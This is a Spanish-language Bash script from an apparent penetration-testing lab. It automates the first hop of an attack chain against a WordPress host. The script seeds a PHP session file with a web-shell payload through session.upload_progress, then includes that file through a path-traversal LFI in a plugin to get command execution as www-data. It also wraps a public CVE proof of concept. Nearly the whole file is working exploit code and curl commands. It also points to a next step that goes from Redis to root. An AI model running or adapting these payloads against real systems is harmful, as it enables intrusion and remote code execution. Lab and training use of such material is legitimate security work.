#!/usr/bin/env bash
# ============================================================================
#  lab/chain/01-m1-php2shell.sh — salto 1: M6 → M1 (www-data)
# ----------------------------------------------------------------------------
#  Muestra (y opcionalmente ejecuta) la entrada al laboratorio por PHP2Shell.
#
#  Dos modos, mismo origen (M1, HTTP pre-auth):
#    entry-a  CVE-2026-109618/109619 puro, PoC público `poc_109618.py`.
#             EN INVESTIGACIÓN: el PoC falla en stage 1 en este entorno.
#             Se corre con time-box y se documenta la limitación.
#    entry-b  PHP2Shell Chain A: session.upload_progress + LFI del plugin
#             legacy-download. OPERATIVO: es el que se usa para la cadena.
#
#  Uso:
#    bash lab/chain/01-m1-php2shell.sh                 # solo imprime (entry-b)
#    bash lab/chain/01-m1-php2shell.sh --entry a       # solo imprime entry-a
#    bash lab/chain/01-m1-php2shell.sh --run           # ejecuta entry-b
#    bash lab/chain/01-m1-php2shell.sh --run --entry a --timebox 600
#
#  Con --run, el SID que funciona se guarda en $LAB_STATE (def. /tmp/lab-chain.env)
#  como evidencia del salto 1.
#
#  Credenciales: las de laboratorio (lab/README.md §6). Datos ficticios.
# ============================================================================

set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LAB_REPO_DIR="${LAB_REPO_DIR:-$(cd "$HERE/../.." && pwd)}"
LAB_ARTIFACTS="${LAB_ARTIFACTS:-$LAB_REPO_DIR/artifacts}"
LAB_LOG="${LAB_LOG:-${TMPDIR:-/tmp}/lab-chain.log}"
export LAB_REPO_DIR LAB_ARTIFACTS LAB_LOG

# shellcheck source=../common/lib.sh
. "$HERE/../common/lib.sh"

LAB_ROLE=chain

RUN=0
ENTRY="${LAB_ENTRY:-b}"
SID="${LAB_SID:-}"
TIMEBOX="${LAB_TIMEBOX:-900}"
WORK="${LAB_WORK:-${HOME:-/tmp}/lab-work}"
M1_URL="${M1_URL:-https://wp.uni.lab/}"
M1_POC_URL="${M1_POC_URL:-https://wp.uni.lab/lab/poc/session.php}"
LFI_PATH="${LFI_PATH:-/wp-content/plugins/legacy-download/dl.php}"
STATE="${LAB_STATE:-${TMPDIR:-/tmp}/lab-chain.env}"

usage() {
  cat <<'EOF'
Uso: bash lab/chain/01-m1-php2shell.sh [opciones]

  --run            ejecutar (por defecto solo imprime los comandos)
  --entry a|b      modo de entrada (def. b, el operativo)
  --sid SID        PHPSESSID a sembrar/usar en entry-b
  --timebox N      segundos máximos para entry-a (def. 900)
  --work DIR       directorio de trabajo del PoC (def. ~/lab-work)
  -h, --help       esta ayuda
EOF
}

while (($#)); do
  case "$1" in
    --run)      RUN=1; shift ;;
    --entry)    ENTRY="${2:?--entry necesita a|b}"; shift 2 ;;
    --entry=*)  ENTRY="${1#*=}"; shift ;;
    --sid)      SID="${2:?--sid necesita un valor}"; shift 2 ;;
    --sid=*)    SID="${1#*=}"; shift ;;
    --timebox)  TIMEBOX="${2:?--timebox necesita segundos}"; shift 2 ;;
    --work)     WORK="${2:?--work necesita una ruta}"; shift 2 ;;
    --work=*)   WORK="${1#*=}"; shift ;;
    -h|--help)  usage; exit 0 ;;
    *) die "opción desconocida: $1 (ver --help)" ;;
  esac
done

[[ "$ENTRY" == a || "$ENTRY" == b ]] || die "--entry solo acepta a o b"
[[ "$TIMEBOX" =~ ^[0-9]+$ ]] || die "--timebox debe ser un número de segundos"

write_state() {
  local sid="$1"
  {
    printf 'WS_SID=%s\n' "$sid"
    printf 'LFI_URL=%s\n' "https://wp.uni.lab${LFI_PATH}"
  } > "$STATE"
  chmod 600 "$STATE"
  ok "estado guardado en $STATE (WS_SID=$sid)"
}

prepare_poc() {
  local zip="$WORK/php2shell-poc-main.zip" dir="$WORK/poc"
  mkdir -p "$dir"
  fetch_artifact "pocs/php2shell-poc-main.zip" "$zip"
  need_cmd unzip
  unzip -o -q "$zip" -d "$dir"
  ok "PoC extraído en $dir"
}

poc_dir() {
  local f
  f=$(find "$WORK/poc" -maxdepth 3 -name 'poc_109618.py' -type f 2>/dev/null | head -n 1)
  [[ -n "$f" ]] && dirname "$f"
}

entry_a_run() {
  local dir; dir="$(poc_dir || true)"
  [[ -n "$dir" ]] || die "no se encontró poc_109618.py (¿corriste --run?)"
  step "entry-a · ejecutando con time-box ${TIMEBOX}s"
  warn "entry-a es el CVE puro y está EN INVESTIGACIÓN: se espera que falle en stage 1"
  local rc=0
  ( cd "$dir" && timeout "$TIMEBOX" python3 poc_109618.py \
      -u "$M1_POC_URL" \
      -c 'id>/tmp/p1' \
      --profile lab --no-auto-offsets --proof-file '' ) || rc=$?
  if (( rc == 124 )); then
    warn "time-box de ${TIMEBOX}s agotado (documentar como limitación)"
  elif (( rc != 0 )); then
    warn "el PoC terminó con código $rc (documentar la etapa donde falló)"
  else
    ok "el PoC terminó sin error; comprobar el archivo de prueba"
    printf '  curl -sk "%s?file=../../../../../../../tmp/p1"\n' "https://wp.uni.lab${LFI_PATH}" >&2
  fi
}

entry_b_run() {
  local sid payload bigpid resp bigfile
  sid="${SID:-lab$(date -u +%s)}"
  payload='<?php echo "LAB-PWN"; system($_GET["c"]); ?>'
  bigfile="$(mktemp "${TMPDIR:-/tmp}/lab-upload.XXXXXX")"
  head -c 8388608 /dev/zero > "$bigfile"

  step "entry-b · sembrando sesión $sid (session.upload_progress)"
  # El valor de PHP_SESSION_UPLOAD_PROGRESS se escribe en el archivo de sesión.
  # Se sube despacio, se corta a los 4 s (cleanup=Off conserva el archivo) y
  # recién entonces se pide el LFI: no se compite por el worker de Apache.
  curl -sk --max-time 180 --limit-rate 128k \
    -b "PHPSESSID=${sid}" \
    --form-string "PHP_SESSION_UPLOAD_PROGRESS=${payload}" \
    -F "payload=@${bigfile};filename=payload.bin" \
    "${M1_URL%/}/lab/session.php" -o /dev/null &
  bigpid=$!
  sleep 4
  kill "$bigpid" 2>/dev/null || true
  wait "$bigpid" 2>/dev/null || true

  step "entry-b · LFI contra el plugin legacy-download"
  resp=$(curl -sk --max-time 30 -G "https://wp.uni.lab${LFI_PATH}" \
           --data-urlencode "file=../../../../../../../tmp/sess_${sid}" \
           --data-urlencode "c=id" || true)

  rm -f "$bigfile"

  printf '%s\n' "$resp" | tail -n 5
  if grep -q 'uid=' <<<"$resp"; then
    ok "RCE como www-data confirmado (SID=$sid)"
    write_state "$sid"
  else
    warn "sin 'uid=' en la respuesta: revisar el sink, session.save_path y upload_progress"
    warn "si 'session.upload_progress.enabled=Off', Chain A está neutralizado (estado parcheado)"
    return 1
  fi
}

# --------------------------------------------------------------- objetivo
lab_banner
step "salto 1 · M6 (${M6}) → M1 (${M1}) · PHP2Shell"
cat <<EOF
Objetivo: obtener ejecución como www-data en M1 (10.10.10.11).

  entry-a  CVE-2026-109618/109619 puro (OOM + corrupción de estado).
           PoC: poc_109618.py. Está EN INVESTIGACIÓN: falla en stage 1.
           Time-box: ${TIMEBOX}s. Si no cierra, se documenta y se sigue.

  entry-b  PHP2Shell Chain A = session.upload_progress + sink LFI.
           OPERATIVO. Es el vector que se declara en el informe y el que
           alimenta el resto de la cadena.
           Sink: /wp-content/plugins/legacy-download/dl.php?file=
EOF

# --------------------------------------------------------------- preparación
step "preparación del PoC (artefacto local, sin Internet)"
cat <<EOF
  cp $LAB_ARTIFACTS/pocs/php2shell-poc-main.zip $WORK/php2shell-poc-main.zip
  unzip -o -q $WORK/php2shell-poc-main.zip -d $WORK/poc
  ls $WORK/poc/*/poc_109618.py
EOF
if (( RUN )); then
  prepare_poc
else
  printf '  (con --run se descarga del espejo local y se descomprime)\n' >&2
fi

# --------------------------------------------------------------- entry-a
step "entry-a · CVE-2026-109618 (en investigación, time-box ${TIMEBOX}s)"
cat <<EOF
  # límite de comando: 14 bytes (carrier de 167 bytes)
  cd $(poc_dir || printf '%s/poc/*' "$WORK")
  timeout ${TIMEBOX} python3 poc_109618.py \\
    -u ${M1_POC_URL} \\
    -c 'id>/tmp/p1' \\
    --profile lab --no-auto-offsets --proof-file ''

  # lectura del marcador por el mismo sink LFI (canal independiente)
  curl -sk "https://wp.uni.lab${LFI_PATH}?file=../../../../../../../tmp/p1"

  # si falla en stage 1 (lo esperado), anotar:
  #   HEAP_LEAK_FAILED / stage 1 → limitación de entry-a, NO se declara resuelto
EOF
if (( RUN && ENTRY == a )); then
  entry_a_run
fi

# --------------------------------------------------------------- entry-b
step "entry-b · session injection + LFI (OPERATIVO)"
cat <<EOF
  # 1) sembrar el archivo de sesión con el payload (subida lenta a propósito)
  SID=\${SID:-lab\$(date -u +%s)}
  head -c 8388608 /dev/zero > /tmp/lab-upload.bin
  curl -sk --limit-rate 128k -b "PHPSESSID=\$SID" \\
    --form-string 'PHP_SESSION_UPLOAD_PROGRESS=<?php echo "LAB-PWN"; system(\$_GET["c"]); ?>' \\
    -F 'payload=@/tmp/lab-upload.bin;filename=payload.bin' \\
    https://wp.uni.lab/lab/session.php &

  # 2) incluir el archivo de sesión por el LFI del plugin heredado
  curl -sk -G "https://wp.uni.lab${LFI_PATH}" \\
    --data-urlencode "file=../../../../../../../tmp/sess_\$SID" \\
    --data-urlencode "c=id"

  # 3) esperado: uid=33(www-data) gid=33(www-data) groups=33(www-data)
  #    con --run, el SID válido queda en ${STATE}
EOF
if (( RUN && ENTRY == b )); then
  entry_b_run
fi

# --------------------------------------------------------------- cierre
step "siguiente salto"
printf '  bash %s/02-m1-to-m2.sh --run    # Redis sin auth -> root en M2\n' "$HERE" >&2
